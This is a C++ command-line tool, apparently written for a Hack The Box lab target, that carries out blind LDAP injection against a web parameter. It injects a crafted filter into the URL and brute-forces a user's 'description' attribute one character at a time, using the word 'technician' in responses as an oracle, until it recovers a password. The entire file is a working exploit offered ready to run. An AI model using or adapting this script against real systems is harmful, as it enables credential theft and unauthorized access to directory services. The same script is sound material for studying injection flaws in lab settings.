#include <iostream>
#include <string>
#include <vector>
#include <csignal>
#include <curl/curl.h>
#include <argparse/argparse.hpp>
#include <sstream>
#include <iomanip>


void ctrl_c(int sig) {
    std::cout << "[!] Ctrl+C. Exiting..." << std::endl;
    exit(1);
}


size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    } catch (std::bad_alloc &e) {
        return 0;
    }
    return newLength;
}


std::string url_encode(const std::string &value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;

    for (char c : value) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else {
            escaped << '%' << std::setw(2) << std::uppercase << int((unsigned char) c);
        }
    }
    return escaped.str();
}

std::string request_to_site(const std::string& url, std::string current_password, const std::vector<char>& all_characters) {
    size_t index = 0;
    while (index < all_characters.size()) {
        char ch = all_characters[index];
        std::cout << "Attempting with char '" << ch << "' (password found, at the moment, '" << current_password << "')" << std::endl;
        std::string req_url = url + "=*)(%26(objectClass=user)(description=" + url_encode(current_password + ch) + "*)";
        CURL* curl = curl_easy_init();
        if (curl) {
            CURLcode res;
            std::string response_string;
            curl_easy_setopt(curl, CURLOPT_URL, req_url.c_str());
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
            res = curl_easy_perform(curl);
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            if (res == CURLE_OK && response_code == 200) {
                std::cout << "Response: " << response_string << std::endl;
                if (response_string.find("technician") != std::string::npos) {  
                    current_password += ch;
                    index = 0;
                } else {
                    index++;
                }
            } else {
                index++;
            }
            curl_easy_cleanup(curl);
        } else {
            std::cerr << "Failed to initialize CURL." << std::endl;
            exit(1);
        }
    }
    return current_password;
}


bool check_password_found(const std::string& url, std::string& current_password, const std::vector<char>& symbols_list, const std::vector<char>& all_chars) {
    for (char symbol : symbols_list) {
        std::string temp_password = current_password + symbol;
        for (char ch : all_chars) {
            std::cout << "Checking with symbol '" << symbol << "' and character '" << ch << "'" << std::endl;
            std::string req_url = url + "=*)(%26(objectClass=user)(description=" + url_encode(temp_password + ch) + "*)";
            CURL* curl = curl_easy_init();
            if (curl) {
                CURLcode res;
                std::string response_string;
                curl_easy_setopt(curl, CURLOPT_URL, req_url.c_str());
                curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
                res = curl_easy_perform(curl);
                long response_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                if (res == CURLE_OK && response_code == 200) {
                    std::cout << "Response: " << response_string << std::endl;
                    if (response_string.find("technician") != std::string::npos) {  
                        current_password += symbol;
                        std::cout << "Password had more symbols ('" << symbol << "', so current password is '" << current_password + symbol << "')" << std::endl;
                        return false;
                    }
                }
                curl_easy_cleanup(curl);
            } else {
                std::cerr << "Failed to initialize CURL." << std::endl;
                exit(1);
            }
        }
    }
    std::cout << "Password checked. All correct." << std::endl;
    return true;
}


void ldap_injection(const std::string& url) {
    std::cout << "[+] Attempting LDAP Injection to url " << url << "..." << std::endl;
    std::string password = "";
    std::vector<char> all_characters;
    for (char c = '0'; c <= '9'; c++) all_characters.push_back(c);
    for (char c = 'a'; c <= 'z'; c++) all_characters.push_back(c);
    for (char c = 'A'; c <= 'Z'; c++) all_characters.push_back(c);
    for (char c : std::string("!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~")) {
        all_characters.push_back(c);
    }

    std::vector<char> symbols_characters(all_characters.begin(), all_characters.end());

    bool foundPassword = false;

    while (!foundPassword) {
        password = request_to_site(url, password, all_characters);
        foundPassword = check_password_found(url, password, symbols_characters, all_characters);
    }

    std::cout << "Password found: " << password << std::endl;
}

int main(int argc, char* argv[]) {
    signal(SIGINT, ctrl_c);
    argparse::ArgumentParser program("ldap_injection");

    program.add_argument("-u", "--url")
        .required()
        .help("URL to attempt LDAP injection (including the injectable parameter). Example: http://internal.analysis.htb/users/list.php?name");

    try {
        program.parse_args(argc, argv);
    } catch (const std::runtime_error& err) {
        std::cerr << err.what() << std::endl;
        std::cerr << program;
        exit(1);
    }

    std::string url = program.get<std::string>("--url");
    ldap_injection(url);

    return 0;
}
